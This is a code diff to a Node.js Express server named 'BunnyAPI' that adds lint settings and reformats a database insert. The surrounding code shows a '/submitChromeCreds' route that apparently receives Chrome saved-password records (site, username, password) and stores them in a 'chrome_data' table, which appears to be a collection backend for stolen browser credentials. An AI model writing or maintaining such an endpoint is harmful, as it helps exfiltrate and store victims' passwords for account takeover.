@@ -1,4 +1,13 @@
-#!/usr/bin/env node
+/* eslint max-len:
+  [ "error", {
+      "ignoreComments": true ,
+      "ignoreUrls": true,
+      "ignoreStrings": true,
+      "ignoreTemplateLiterals": true,
+      "ignoreRegExpLiterals": true
+    }]
+*/
+/* eslint new-cap: ["error", { "capIsNewExceptionPattern": "^express\.." }]*/
 /* ---- BunnyAPI ----
 * @Author: Daniel W. Anner
 */
@@ -26,9 +35,12 @@ router.post('/submitChromeCreds', function(req, res, next) {
       const query = 'INSERT INTO chrome_data (dataset, chrome_url, chrome_user, chrome_pw) VALUES (?, ?, ?, ?)';
 
       /* insert the data sanatized to prevent sql injection */
-      db.query(query, [ranStamp, el.signon_realm, el.username_value, el.password_value], function(err, status) {
-        if (err) return next(err);
-      });
+      db.query(query,
+          [ranStamp, el.signon_realm, el.username_value, el.password_value],
+          function(err, status) {
+            if (err) return next(err);
+          }
+      );
     });
 
     log.info('Added data to table', dataArray);
